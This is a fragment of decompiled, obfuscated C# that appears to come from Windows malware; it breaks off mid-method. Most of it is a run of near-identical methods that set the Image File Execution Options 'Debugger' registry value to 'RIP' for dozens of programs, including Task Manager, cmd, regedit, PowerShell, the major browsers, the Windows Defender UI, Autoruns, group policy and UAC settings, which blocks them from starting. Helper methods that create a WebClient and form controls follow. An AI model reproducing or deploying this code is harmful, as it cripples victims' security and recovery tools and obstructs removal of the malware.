	public void method_18()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\msconfig.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\msconfig.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_19()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_20()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_21()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_22()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chrome.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chrome.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_23()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\firefox.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\firefox.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_24()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\opera.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\opera.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_25()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\microsoftedge.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\microsoftedge.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_26()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\microsoftedgecp.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\microsoftedgecp.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_27()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad++.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad++.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_28()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_29()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_30()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\MSASCuiL.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\MSASCuiL.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_31()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mmc.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mmc.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_32()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\gpedit.msc", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\gpedit.msc", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_33()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\UserAccountControlSettings.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\UserAccountControlSettings.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_34()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Autoruns64.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Autoruns64.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_35()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Autoruns.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Autoruns.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_36()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\systemexplorer.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\systemexplorer.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_37()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskkill.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskkill.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_38()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\powershell.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\powershell.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_39()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\yandex.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\yandex.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_40()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\attrib.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\attrib.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_41()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\bcdedit.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\bcdedit.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_42()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_43()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mspaint.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mspaint.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_44()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\dllhost.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\dllhost.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_45()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rundll32.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rundll32.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_46()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rundll.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rundll.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_47()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cabinet.dll", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cabinet.dll", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_48()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chkdsk.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chkdsk.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_49()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DBGHELP.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DBGHELP.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_50()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DCIMAN32.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DCIMAN32.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_51()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wmplayer.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wmplayer.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_52()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ksuser.dll", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ksuser.dll", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_53()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mpg4dmod.dll", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mpg4dmod.dll", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_54()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mydocs.dll", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mydocs.dll", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_55()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rasman.dll", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rasman.dll", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_56()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shellstyle.dll", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shellstyle.dll", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_57()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\secpol.msc", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\secpol.msc", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_58()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\url.dll", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\url.dll", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_59()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\usbui.dll", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\usbui.dll", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_60()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\webcheck.dll", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\webcheck.dll", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_61()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\recoverydrive.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\recoverydrive.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_62()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logoff.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logoff.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_63()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\control.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\control.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	public void method_64()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\csrss.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\csrss.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)"RIP");
	}

	static void smethod_0(Form form_0, FormClosingEventHandler formClosingEventHandler_0)
	{
		form_0.add_FormClosing(formClosingEventHandler_0);
	}

	static void smethod_1(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_2(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static WebClient smethod_3()
	{
		return new WebClient();
	}

	static void smethod_4(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_5()
	{
		return new Container();
	}

	static Type smethod_6(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static ComponentResourceManager smethod_7(Type type_0)
	{
		return new ComponentResourceManager(type_0);
	}

	static Timer smethod_8(IContainer icontainer_1)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_1);
	}

	static TextBox smethod_9()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new TextBox();
	}

	static ListBox smethod_10()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ListBox();
	}

	static Button smethod_11()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static Label smethod_12()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static RichTextBox smethod_13()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static void smethod_14(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_15(TextBoxBase textBoxBase_0, Color color_0)
	{
		textBoxBase_0.set_BackColor(color_0);
	}

	static Cursor smethod_16()
	{
		return Cursors.get_IBeam();
	}

	static void smethod_17(Control control_0, Cursor cursor_0)
	{
		control_0.set_Cursor(cursor_0);
	}

	static Font smethod_18(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_19(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static Color smethod_20()
	{
		return SystemColors.WindowText;
	}

	static void smethod_21(TextBoxBase textBoxBase_0, Color color_0)
	{
		textBoxBase_0.set_ForeColor(color_0);
	}

	static void smethod_22(Timer timer_5, EventHandler eventHandler_0)
	{
		timer_5.remove_Tick(eventHandler_0);
	}

	static void smethod_23(Timer timer_5, EventHandler eventHandler_0)
	{
		timer_5.add_Tick(eventHandler_0);
	}

	static void smethod_24(Control control_0, KeyEventHandler keyEventHandler_0)
	{
		control_0.remove_KeyDown(keyEventHandler_0);
	}

	static void smethod_25(Control control_0, KeyEventHandler keyEventHandler_0)
	{
		control_0.add_KeyDown(keyEventHandler_0);
	}

	static void smethod_26(Control control_0, EventHandler eventHandler_0)
